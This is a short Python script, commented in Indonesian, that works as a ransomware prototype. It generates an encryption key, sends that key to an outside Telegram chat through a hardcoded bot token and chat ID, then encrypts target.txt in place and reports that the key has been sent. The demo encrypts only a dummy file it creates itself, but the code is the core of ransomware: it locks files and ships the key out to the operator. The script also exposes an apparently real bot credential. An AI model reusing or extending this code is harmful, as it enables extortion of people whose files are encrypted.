import requests
from cryptography.fernet import Fernet

# --- DATA YANG SUDAH KITA TEMUKAN ---
TOKEN = "8118606358:AAHXi0iaUy5M7F6Gs-sbnzqN5kmIbAKxlPo"
CHAT_ID = "5415677563"

def kirim_ke_telegram(pesan):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": pesan}
    try:
        requests.post(url, data=data)
    except:
        print("Koneksi gagal!")

# 1. Generate Kunci & Pesan
kunci = Fernet.generate_key()
kunci_teks = kunci.decode()

# 2. Kirim Notifikasi ke HP kamu
kirim_ke_telegram(f"🔓 KUNCI DEKRIPSI DITEMUKAN!\n\nUser: Kurumii-Kali\nKey: {kunci_teks}")

# 3. Proses Enkripsi File
cipher = Fernet(kunci)
# Pastikan file target.txt sudah ada
with open("target.txt", "w") as f:
    f.write("DOKUMEN RAHASIA NEGARA - JANGAN DIBUKA")

with open("target.txt", "rb") as f:
    konten = f.read()

terkunci = cipher.encrypt(konten)

with open("target.txt", "wb") as f:
    f.write(terkunci)

print("[-] File target.txt telah dienkripsi.")
print("[+] Kunci telah dikirim ke Telegram!")
